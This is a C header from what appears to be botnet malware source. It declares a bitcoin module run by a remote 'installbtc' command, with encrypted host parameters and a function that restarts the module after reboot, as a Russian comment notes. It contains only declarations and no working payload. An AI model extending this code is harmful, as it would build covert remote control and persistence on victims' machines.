#ifndef BitcoinH
#define BitcoinH

#include "BotConfig.h"
#include "Config.h"
#include "Task.h"

#define BITCOIN_PARAM_SIZE_HOSTS       256
#define BITCOIN_PARAM_NAME_HOSTS       "__BITCOIN_HOSTS__\0"
#define BITCOIN_PARAM_ENCRYPTED_HOSTS  BOTPARAM_ENCRYPTED_MAINHOSTS

#define CommandInstallbtc "installbtc"

bool ExecuteBitcoin(PTaskManager Manager, PCHAR Command, PCHAR Args);
//запускает биткоин после ребута, если он был запущен до ребута
void BitcoinRunAfterReboot();

#endif //BitcoinH
